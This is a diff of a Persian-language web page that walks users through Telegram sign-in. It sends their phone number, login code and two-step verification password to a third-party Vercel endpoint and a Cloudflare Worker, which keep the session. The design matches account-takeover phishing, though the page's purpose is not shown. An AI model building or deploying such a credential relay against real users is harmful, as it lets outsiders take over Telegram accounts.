@@ -378,433 +378,454 @@
 
     <!-- صفحه وارد کردن کد تایید -->
     <div id="codeScreen" class="card hidden">
-      <h2>تایید شماره تلفن</h2>
-      <p>کد تأیید ارسال شده به شماره <span id="phoneNumber"></span> را وارد کنید</p>
+      <h2>تأیید شماره تلفن</h2>
+      <p>کد تأیید ارسال شده به تلگرام خود را وارد کنید</p>
       
       <div class="input-group">
         <label for="code">کد تأیید</label>
-        <input id="code" type="text" placeholder="کد ۵ رقمی" maxlength="5" />
+        <input id="code" type="text" placeholder="کد ۵ رقمی" />
       </div>
-
-      <div class="timer">
-        زمان باقی‌مانده: <span id="countdown">60</span> ثانیه
-      </div>
-
-      <button id="sendCode" class="btn">تایید و ادامه</button>
+      
+      <div class="timer" id="timer">زمان باقی‌مانده: <span id="timeLeft">02:00</span></div>
       
       <div class="action-buttons">
-        <button id="resendCode" class="btn btn-outline btn-small" disabled>
-          ارسال مجدد کد
-        </button>
-        <button id="editPhone" class="btn btn-secondary btn-small">
-          <i class="fas fa-edit"></i> ویرایش شماره
-        </button>
+        <button id="verifyCode" class="btn">تأیید کد</button>
+        <button id="resendCode" class="btn btn-secondary">ارسال مجدد</button>
       </div>
       
-      <div id="codeStatus" class="status"></div>
+      <div id="codeStatus" class="status info">در انتظار دریافت و وارد کردن کد</div>
     </div>
 
     <!-- صفحه وارد کردن رمز دومرحله‌ای -->
     <div id="passwordScreen" class="card hidden">
       <h2>رمز دومرحله‌ای</h2>
-      <p>حساب شما دارای رمز دومرحله‌ای است. لطفاً رمز خود را وارد کنید.</p>
+      <p>لطفاً رمز دومرحله‌ای حساب خود را وارد کنید</p>
       
       <div class="input-group">
         <label for="password">رمز دومرحله‌ای</label>
         <input id="password" type="password" placeholder="رمز دومرحله‌ای خود را وارد کنید" />
       </div>
-
-      <button id="sendPassword" class="btn">تایید و ادامه</button>
       
       <div class="action-buttons">
-        <button id="backToCode" class="btn btn-secondary btn-small">
-          <i class="fas fa-arrow-right"></i> بازگشت
-        </button>
+        <button id="verifyPassword" class="btn">تأیید رمز</button>
+        <button id="backToPhone" class="btn btn-secondary">بازگشت</button>
       </div>
       
-      <div id="passwordStatus" class="status"></div>
+      <div id="passwordStatus" class="status info">لطفاً رمز دومرحله‌ای خود را وارد کنید</div>
     </div>
 
-    <!-- صفحه اطلاعات کاربر -->
-    <div id="userScreen" class="card hidden">
-      <h2>اطلاعات حساب کاربری</h2>
-      <p>مشخصات حساب تلگرام شما با موفقیت دریافت شد</p>
+    <!-- صفحه داشبورد کاربر -->
+    <div id="dashboardScreen" class="card hidden">
+      <h2>خوش آمدید!</h2>
+      <p>شما با موفقیت وارد حساب کاربری خود شدید.</p>
       
-      <div class="user-info-card">
-        <h3>مشخصات کاربر</h3>
-        <div class="info-row">
-          <span class="info-label">نام:</span>
-          <span id="userFirstName" class="info-value">در حال بارگذاری...</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">نام خانوادگی:</span>
-          <span id="userLastName" class="info-value">در حال بارگذاری...</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">نام کاربری:</span>
-          <span id="userUsername" class="info-value">در حال بارگذاری...</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">شماره تلفن:</span>
-          <span id="userPhone" class="info-value">در حال بارگذاری...</span>
-        </div>
-        <div class="info-row">
-          <span class="info-label">آیدی عددی:</span>
-          <span id="userId" class="info-value">در حال بارگذاری...</span>
+      <div class="user-info">
+        <div class="user-info-card">
+          <h3>مشخصات حساب کاربری</h3>
+          <div class="info-row">
+            <span class="info-label">نام:</span>
+            <span class="info-value" id="userFirstName">در حال بارگذاری...</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">نام خانوادگی:</span>
+            <span class="info-value" id="userLastName">در حال بارگذاری...</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">نام کاربری:</span>
+            <span class="info-value" id="userUsername">در حال بارگذاری...</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">شماره تلفن:</span>
+            <span class="info-value" id="userPhone">در حال بارگذاری...</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">شناسه کاربری:</span>
+            <span class="info-value" id="userId">در حال بارگذاری...</span>
+          </div>
         </div>
       </div>
       
       <div class="dev-notice">
         <i class="fas fa-tools"></i>
-        <strong>در حال توسعه:</strong> این برنامه در حال توسعه است و قابلیت‌های بیشتری به زودی اضافه خواهد شد.
+        این برنامه در حال توسعه است و قابلیت‌های جدید به زودی اضافه خواهند شد.
       </div>
       
       <div class="dashboard-actions">
-        <button id="logoutBtn" class="btn btn-outline">
-          <i class="fas fa-sign-out-alt"></i> خروج
-        </button>
-        <button id="refreshBtn" class="btn">
-          <i class="fas fa-sync-alt"></i> بروزرسانی
-        </button>
+        <button id="logoutBtn" class="btn btn-outline">خروج از حساب</button>
       </div>
-      
-      <div id="userStatus" class="status"></div>
     </div>
   </div>
 
   <script>
-    // متغیرهای سراسری
-    const WORKER_URL = 'https://tell.a09627301.workers.dev';
+    // آدرس‌های API
+    const LOGIN_API_URL = 'https://telegram-login-vercel.vercel.app/api/login';
+    const WORKER_API_URL = 'https://tell.a09627301.workers.dev/api';
+    
+    // عناصر DOM
+    const welcomeScreen = document.getElementById('welcomeScreen');
+    const phoneScreen = document.getElementById('phoneScreen');
+    const codeScreen = document.getElementById('codeScreen');
+    const passwordScreen = document.getElementById('passwordScreen');
+    const dashboardScreen = document.getElementById('dashboardScreen');
+    
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
+    const passwordInput = document.getElementById('password');
+    
+    const sendPhoneBtn = document.getElementById('sendPhone');
+    const verifyCodeBtn = document.getElementById('verifyCode');
+    const resendCodeBtn = document.getElementById('resendCode');
+    const verifyPasswordBtn = document.getElementById('verifyPassword');
+    const backToPhoneBtn = document.getElementById('backToPhone');
+    const startBtn = document.getElementById('startBtn');
+    const logoutBtn = document.getElementById('logoutBtn');
+    
+    const phoneStatus = document.getElementById('phoneStatus');
+    const codeStatus = document.getElementById('codeStatus');
+    const passwordStatus = document.getElementById('passwordStatus');
+    
+    const timeLeftElement = document.getElementById('timeLeft');
+    
+    // متغیرهای وضعیت
     let currentPhone = '';
     let phoneCodeHash = '';
-    let countdownInterval;
-    let countdownTime = 60;
     let sessionId = localStorage.getItem('telegram_session_id');
+    let countdown;
+    let countdownTime = 120; // 2 دقیقه
 
     // بررسی session هنگام بارگذاری صفحه
     document.addEventListener('DOMContentLoaded', function() {
+      // اگر sessionId در localStorage وجود دارد، بررسی کن
       if (sessionId) {
         checkSession();
       } else {
-        showScreen('welcomeScreen');
+        showScreen(welcomeScreen);
       }
     });
 
-    // مدیریت کلیک روی دکمه شروع
-    document.getElementById('startBtn').addEventListener('click', function() {
-      showScreen('phoneScreen');
+    // بررسی session از طریق Cloudflare Worker
+    async function checkSession() {
+      try {
+        phoneStatus.textContent = 'در حال بررسی وضعیت ورود...';
+        phoneStatus.className = 'status loading';
+        
+        const response = await fetch(`${WORKER_API_URL}/check-session`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ sessionId })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          // کاربر قبلاً وارد شده است، نمایش داشبورد
+          showUserDashboard(data.user);
+        } else {
+          // session معتبر نیست، حذف از localStorage
+          localStorage.removeItem('telegram_session_id');
+          sessionId = null;
+          showScreen(welcomeScreen);
+        }
+      } catch (error) {
+        console.error('Session check error:', error);
+        phoneStatus.textContent = 'خطا در بررسی وضعیت ورود. لطفاً دوباره وارد شوید.';
+        phoneStatus.className = 'status error';
+        localStorage.removeItem('telegram_session_id');
+        sessionId = null;
+        showScreen(welcomeScreen);
+      }
+    }
+
+    // نمایش صفحه مورد نظر و مخفی کردن بقیه
+    function showScreen(screen) {
+      [welcomeScreen, phoneScreen, codeScreen, passwordScreen, dashboardScreen].forEach(s => {
+        s.classList.add('hidden');
+      });
+      screen.classList.remove('hidden');
+    }
+
+    // شروع فرآیند ورود
+    startBtn.addEventListener('click', function() {
+      showScreen(phoneScreen);
     });
 
-    // مدیریت ارسال شماره تلفن
-    document.getElementById('sendPhone').addEventListener('click', function() {
-      const phone = document.getElementById('phone').value.trim();
+    // ارسال شماره تلفن
+    sendPhoneBtn.addEventListener('click', async function() {
+      const phone = phoneInput.value.trim();
       
-      if (!isValidPhoneNumber(phone)) {
-        updateStatus('phoneStatus', 'لطفاً شماره تلفن معتبر وارد کنید', 'error');
+      if (!phone) {
+        phoneStatus.textContent = 'لطفاً شماره تلفن خود را وارد کنید';
+        phoneStatus.className = 'status error';
+        return;
+      }
+      
+      if (!phone.startsWith('+')) {
+        phoneStatus.textContent = 'لطفاً شماره تلفن را با کد کشور وارد کنید (مثال: +989123456789)';
+        phoneStatus.className = 'status error';
         return;
       }
       
       currentPhone = phone;
-      sendVerificationCode(phone);
-    });
-
-    // مدیریت ارسال کد تأیید
-    document.getElementById('sendCode').addEventListener('click', function() {
-      const code = document.getElementById('code').value.trim();
-      
-      if (!code || code.length !== 5) {
-        updateStatus('codeStatus', 'لطفاً کد تأیید ۵ رقمی را وارد کنید', 'error');
-        return;
-      }
-      
-      verifyCode(code);
-    });
-
-    // مدیریت ارسال رمز دومرحله‌ای
-    document.getElementById('sendPassword').addEventListener('click', function() {
-      const password = document.getElementById('password').value.trim();
-      
-      if (!password) {
-        updateStatus('passwordStatus', 'لطفاً رمز دومرحله‌ای را وارد کنید', 'error');
-        return;
-      }
-      
-      verifyPassword(password);
-    });
-
-    // مدیریت ویرایش شماره تلفن
-    document.getElementById('editPhone').addEventListener('click', function() {
-      clearInterval(countdownInterval);
-      showScreen('phoneScreen');
-    });
-
-    // مدیریت ارسال مجدد کد
-    document.getElementById('resendCode').addEventListener('click', function() {
-      sendVerificationCode(currentPhone);
-    });
-
-    // مدیریت بازگشت از صفحه رمز دومرحله‌ای
-    document.getElementById('backToCode').addEventListener('click', function() {
-      showScreen('codeScreen');
-      startCountdown();
-    });
-
-    // مدیریت خروج
-    document.getElementById('logoutBtn').addEventListener('click', function() {
-      logout();
-    });
-
-    // مدیریت بروزرسانی اطلاعات
-    document.getElementById('refreshBtn').addEventListener('click', function() {
-      if (sessionId) {
-        checkSession();
-      } else {
-        updateStatus('userStatus', 'لطفاً مجدداً وارد شوید', 'error');
-        showScreen('phoneScreen');
-      }
-    });
-
-    // اعتبارسنجی شماره تلفن
-    function isValidPhoneNumber(phone) {
-      const regex = /^(\+98|0)?9\d{9}$/;
-      return regex.test(phone.replace(/\s/g, ''));
-    }
-
-    // ارسال کد تأیید
-    async function sendVerificationCode(phone) {
-      updateStatus('phoneStatus', 'در حال ارسال کد تأیید...', 'loading');
+      phoneStatus.textContent = 'در حال ارسال کد تأیید...';
+      phoneStatus.className = 'status loading';
       
       try {
-        const response = await fetch(`${WORKER_URL}/api/login`, {
+        const response = await fetch(LOGIN_API_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            action: 'sendCode',
-            phone: phone
+            step: 'sendCode',
+            phone: phone,
+            sessionId: sessionId
           })
         });
         
         const data = await response.json();
         
         if (data.success) {
-          updateStatus('phoneStatus', data.message, 'success');
-          document.getElementById('phoneNumber').textContent = phone;
           phoneCodeHash = data.phoneCodeHash;
-          showScreen('codeScreen');
+          phoneStatus.textContent = 'کد تأیید ارسال شد';
+          phoneStatus.className = 'status success';
+          
+          // نمایش صفحه وارد کردن کد
+          showScreen(codeScreen);
+          
+          // شروع تایمر
           startCountdown();
         } else {
-          updateStatus('phoneStatus', data.message, 'error');
+          phoneStatus.textContent = data.message || 'خطا در ارسال کد تأیید';
+          phoneStatus.className = 'status error';
         }
       } catch (error) {
-        console.error('Error sending code:', error);
-        updateStatus('phoneStatus', 'خطا در ارسال کد تأیید. لطفاً دوباره امتحان کنید.', 'error');
+        console.error('Send code error:', error);
+        phoneStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
+        phoneStatus.className = 'status error';
       }
-    }
+    });
 
     // تأیید کد
-    async function verifyCode(code) {
-      updateStatus('codeStatus', 'در حال تأیید کد...', 'loading');
+    verifyCodeBtn.addEventListener('click', async function() {
+      const code = codeInput.value.trim();
+      
+      if (!code || code.length !== 5) {
+        codeStatus.textContent = 'لطفاً کد تأیید ۵ رقمی را وارد کنید';
+        codeStatus.className = 'status error';
+        return;
+      }
+      
+      codeStatus.textContent = 'در حال تأیید کد...';
+      codeStatus.className = 'status loading';
       
       try {
-        const response = await fetch(`${WORKER_URL}/api/login`, {
+        const response = await fetch(LOGIN_API_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            action: 'verifyCode',
+            step: 'verifyCode',
             phone: currentPhone,
             code: code,
-            phoneCodeHash: phoneCodeHash
+            phoneCodeHash: phoneCodeHash,
+            sessionId: sessionId
           })
         });
         
         const data = await response.json();
         
         if (data.success) {
-          clearInterval(countdownInterval);
-          updateStatus('codeStatus', data.message, 'success');
+          // توقف تایمر
+          clearInterval(countdown);
           
-          // ذخیره session
-          sessionId = data.sessionId;
-          if (sessionId) {
+          // ذخیره sessionId
+          if (data.sessionId) {
+            sessionId = data.sessionId;
             localStorage.setItem('telegram_session_id', sessionId);
           }
           
-          // نمایش اطلاعات کاربر
-          displayUserInfo(data.user);
-          showScreen('userScreen');
+          // نمایش داشبورد کاربر
+          showUserDashboard(data.user);
         } else if (data.needPassword) {
           // نیاز به رمز دومرحله‌ای
-          showScreen('passwordScreen');
-          updateStatus('passwordStatus', 'لطفاً رمز دومرحله‌ای خود را وارد کنید', 'info');
+          codeStatus.textContent = 'لطفاً رمز دومرحله‌ای خود را وارد کنید';
+          codeStatus.className = 'status info';
+          showScreen(passwordScreen);
         } else {
-          updateStatus('codeStatus', data.message, 'error');
+          codeStatus.textContent = data.message || 'خطا در تأیید کد';
+          codeStatus.className = 'status error';
         }
       } catch (error) {
-        console.error('Error verifying code:', error);
-        updateStatus('codeStatus', 'خطا در تأیید کد. لطفاً دوباره امتحان کنید.', 'error');
+        console.error('Verify code error:', error);
+        codeStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
+        codeStatus.className = 'status error';
       }
-    }
+    });
 
-    // تأیید رمز دومرحله‌ای
-    async function verifyPassword(password) {
-      updateStatus('passwordStatus', 'در حال تأیید رمز...', 'loading');
+    // ارسال مجدد کد
+    resendCodeBtn.addEventListener('click', async function() {
+      codeStatus.textContent = 'در حال ارسال مجدد کد...';
+      codeStatus.className = 'status loading';
       
       try {
-        const response = await fetch(`${WORKER_URL}/api/login`, {
+        const response = await fetch(LOGIN_API_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            action: 'checkPassword',
+            step: 'sendCode',
             phone: currentPhone,
-            password: password
+            sessionId: sessionId
           })
         });
         
         const data = await response.json();
         
         if (data.success) {
-          updateStatus('passwordStatus', data.message, 'success');
+          phoneCodeHash = data.phoneCodeHash;
+          codeStatus.textContent = 'کد تأیید مجدداً ارسال شد';
+          codeStatus.className = 'status success';
           
-          // ذخیره session
-          sessionId = data.sessionId;
-          if (sessionId) {
+          // ریست کردن تایمر
+          clearInterval(countdown);
+          countdownTime = 120;
+          updateTimerDisplay();
+          startCountdown();
+        } else {
+          codeStatus.textContent = data.message || 'خطا در ارسال مجدد کد';
+          codeStatus.className = 'status error';
+        }
+      } catch (error) {
+        console.error('Resend code error:', error);
+        codeStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
+        codeStatus.className = 'status error';
+      }
+    });
+
+    // تأیید رمز دومرحله‌ای
+    verifyPasswordBtn.addEventListener('click', async function() {
+      const password = passwordInput.value.trim();
+      
+      if (!password) {
+        passwordStatus.textContent = 'لطفاً رمز دومرحله‌ای خود را وارد کنید';
+        passwordStatus.className = 'status error';
+        return;
+      }
+      
+      passwordStatus.textContent = 'در حال تأیید رمز...';
+      passwordStatus.className = 'status loading';
+      
+      try {
+        const response = await fetch(LOGIN_API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            step: 'checkPassword',
+            phone: currentPhone,
+            password: password,
+            sessionId: sessionId
+          })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          // ذخیره sessionId
+          if (data.sessionId) {
+            sessionId = data.sessionId;
             localStorage.setItem('telegram_session_id', sessionId);
           }
           
-          // نمایش اطلاعات کاربر
-          displayUserInfo(data.user);
-          showScreen('userScreen');
+          // نمایش داشبورد کاربر
+          showUserDashboard(data.user);
         } else {
-          updateStatus('passwordStatus', data.message, 'error');
+          passwordStatus.textContent = data.message || 'خطا در تأیید رمز';
+          passwordStatus.className = 'status error';
         }
       } catch (error) {
-        console.error('Error verifying password:', error);
-        updateStatus('passwordStatus', 'خطا در تأیید رمز. لطفاً دوباره امتحان کنید.', 'error');
+        console.error('Verify password error:', error);
+        passwordStatus.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره امتحان کنید.';
+        passwordStatus.className = 'status error';
       }
-    }
+    });
 
-    // نمایش اطلاعات کاربر
-    function displayUserInfo(user) {
+    // بازگشت به صفحه شماره تلفن
+    backToPhoneBtn.addEventListener('click', function() {
+      showScreen(phoneScreen);
+    });
+
+    // خروج از حساب کاربری
+    logoutBtn.addEventListener('click', async function() {
+      try {
+        const response = await fetch(LOGIN_API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            action: 'logout',
+            sessionId: sessionId
+          })
+        });
+        
+        // حذف sessionId از localStorage بدون توجه به پاسخ سرور
+        localStorage.removeItem('telegram_session_id');
+        sessionId = null;
+        
+        // بازگشت به صفحه خوش آمدگویی
+        showScreen(welcomeScreen);
+      } catch (error) {
+        console.error('Logout error:', error);
+        // حتی در صورت خطا، session را حذف کن
+        localStorage.removeItem('telegram_session_id');
+        sessionId = null;
+        showScreen(welcomeScreen);
+      }
+    });
+
+    // نمایش داشبورد کاربر
+    function showUserDashboard(user) {
+      // پر کردن اطلاعات کاربر
       document.getElementById('userFirstName').textContent = user.firstName || 'تعیین نشده';
       document.getElementById('userLastName').textContent = user.lastName || 'تعیین نشده';
       document.getElementById('userUsername').textContent = user.username ? '@' + user.username : 'تعیین نشده';
       document.getElementById('userPhone').textContent = user.phone || currentPhone;
       document.getElementById('userId').textContent = user.id || 'نامشخص';
+      
+      // نمایش داشبورد
+      showScreen(dashboardScreen);
     }
 
     // شروع تایمر معکوس
     function startCountdown() {
-      clearInterval(countdownInterval);
-      countdownTime = 60;
-      document.getElementById('countdown').textContent = countdownTime;
-      document.getElementById('resendCode').disabled = true;
+      clearInterval(countdown);
+      countdownTime = 120;
+      updateTimerDisplay();
       
-      countdownInterval = setInterval(() => {
+      countdown = setInterval(function() {
         countdownTime--;
-        document.getElementById('countdown').textContent = countdownTime;
         
         if (countdownTime <= 0) {
-          clearInterval(countdownInterval);
-          document.getElementById('resendCode').disabled = false;
+          clearInterval(countdown);
+          codeStatus.textContent = 'کد تأیید منقضی شده است. لطفاً کد جدیدی دریافت کنید.';
+          codeStatus.className = 'status error';
+        } else {
+          updateTimerDisplay();
         }
       }, 1000);
     }
 
-    // بررسی session
-    async function checkSession() {
-      updateStatus('userStatus', 'در حال بررسی وضعیت ورود...', 'loading');
-      showScreen('userScreen');
-      
-      try {
-        const response = await fetch(`${WORKER_URL}/api/check-session`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            sessionId: sessionId
-          })
-        });
-        
-        const data = await response.json();
-        
-        if (data.success) {
-          updateStatus('userStatus', data.message, 'success');
-          displayUserInfo(data.user);
-        } else {
-          updateStatus('userStatus', data.message, 'error');
-          localStorage.removeItem('telegram_session_id');
-          sessionId = null;
-          showScreen('phoneScreen');
-        }
-      } catch (error) {
-        console.error('Error checking session:', error);
-        updateStatus('userStatus', 'خطا در بررسی وضعیت ورود. لطفاً دوباره امتحان کنید.', 'error');
-        localStorage.removeItem('telegram_session_id');
-        sessionId = null;
-        showScreen('phoneScreen');
-      }
-    }
-
-    // خروج از حساب
-    async function logout() {
-      updateStatus('userStatus', 'در حال خروج...', 'loading');
-      
-      try {
-        const response = await fetch(`${WORKER_URL}/api/logout`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            sessionId: sessionId
-          })
-        });
-        
-        const data = await response.json();
-        
-        if (data.success) {
-          updateStatus('userStatus', data.message, 'success');
-          localStorage.removeItem('telegram_session_id');
-          sessionId = null;
-          setTimeout(() => {
-            showScreen('phoneScreen');
-          }, 1500);
-        } else {
-          updateStatus('userStatus', data.message, 'error');
-        }
-      } catch (error) {
-        console.error('Error logging out:', error);
-        updateStatus('userStatus', 'خطا در خروج. لطفاً دوباره امتحان کنید.', 'error');
-      }
-    }
-
-    // نمایش صفحه مورد نظر
-    function showScreen(screenId) {
-      // مخفی کردن تمام صفحات
-      document.querySelectorAll('.card').forEach(card => {
-        card.classList.add('hidden');
-      });
-      
-      // نمایش صفحه درخواستی
-      document.getElementById(screenId).classList.remove('hidden');
-    }
-
-    // به‌روزرسانی وضعیت
-    function updateStatus(elementId, message, type) {
-      const element = document.getElementById(elementId);
-      element.textContent = message;
-      element.className = 'status';
-      
-      if (type) {
-        element.classList.add(type);
-      }
+    // به روز رسانی نمایش تایمر
+    function updateTimerDisplay() {
+      const minutes = Math.floor(countdownTime / 60);
+      const seconds = countdownTime % 60;
+      timeLeftElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
     }
   </script>
 </body>
